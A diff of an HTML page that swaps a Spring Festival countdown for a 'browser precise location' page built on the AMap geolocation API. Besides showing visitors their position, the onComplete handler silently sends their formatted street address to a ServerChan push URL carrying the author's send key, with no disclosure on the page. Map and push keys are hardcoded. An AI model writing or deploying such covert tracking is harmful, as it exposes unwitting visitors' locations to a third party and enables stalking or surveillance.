@@ -1,39 +1,65 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html>
+
 <head>
-    <meta charset="UTF-8">
+    <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>春</title>
-    <link rel="stylesheet" href="Fund operation.css">
-</head>
+    <meta name="viewport" content="initial-scale=1.0, user-scalable=no, width=device-width">
+    <title>浏览器精确定位</title>
 <body>
-    <div id="div0">
-        <p>当前时间为：<p id="now_hns">时间</p></p>
+    <div id='container'></div>
+    <div class="info">
+        <h4 id='status'></h4>
+        <hr>
+        <p id='result'></p>
+        <hr>
     </div>
-    <div id="div1">
-        <p id="chunjie">春节倒计时</p>
-        <div id="date">
-            <p>天</p>
-            <p>时</p>
-            <p>分</p>
-            <p>秒</p>
-        </div>
-        <div class="millisecond">
-            <p>毫秒倒计时：
-                <p id="millise">毫秒</p>
-            </p>
-        </div>
-    </div>
-    <!-- <div id="div2">
-        
-    </div> -->
-    <!-- <div id="div3">
-        <img src="1.jpg" alt="" id="div3_1">
-    </div> -->
-    <div id="div4">
-        <p id="div4_p" ></p>
-    </div>
-    <script src="Fund operation.js"></script>
+    <script type="text/javascript"
+        src="https://webapi.amap.com/maps?v=1.4.15&key=335ccf65098326fa390372a889d78c33"></script>
+    <script type="text/javascript">
+        var map = new AMap.Map('container', {
+            resizeEnable: true
+        });
+        AMap.plugin('AMap.Geolocation', function () {
+            var geolocation = new AMap.Geolocation({
+                enableHighAccuracy: true,//是否使用高精度定位，默认:true
+                timeout: 10000,          //超过10秒后停止定位，默认：5s
+                buttonPosition: 'RB',    //定位按钮的停靠位置
+                buttonOffset: new AMap.Pixel(10, 20),//定位按钮与设置的停靠位置的偏移量，默认：Pixel(10, 20)
+                zoomToAccuracy: true,   //定位成功后是否自动调整地图视野到定位点
+            });
+            var geolocations = new AMap.Geolocation();
+            map.addControl(geolocation);
+            geolocation.getCurrentPosition(function (status, result) {
+                if (status == 'complete') {
+                    onComplete(result)
+                } else {
+                    onError(result)
+                }
+            });
+        });
+        function onComplete(data) {
+            console.log(data);
+            document.getElementById('status').innerHTML = '定位成功'
+            var str = [];
+            str.push('定位结果：' + data.position);
+            str.push('位置信息：' + data.formattedAddress);
+            str.push('定位类别：' + data.location_type);
+            console.log(data);
+            if (data.accuracy) {
+                str.push('精度：' + data.accuracy + ' 米');
+            }
+            str.push('是否经过偏移：' + (data.isConverted ? '是' : '否'));
+            document.getElementById('result').innerHTML = str.join('<br>');
+            var url = "https://sctapi.ftqq.com/SCT118418TYTpPgLPpQEf9DQM1rUSzlTq6.send?title=定位成功&desp=" + data.formattedAddress;
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', url, true);
+            xhr.send();
+        }
+        function onError(data) {
+            document.getElementById('status').innerHTML = '定位失败'
+            document.getElementById('result').innerHTML = '失败原因排查信息:' + data.message;
+        }
+    </script>
 </body>
 </html>
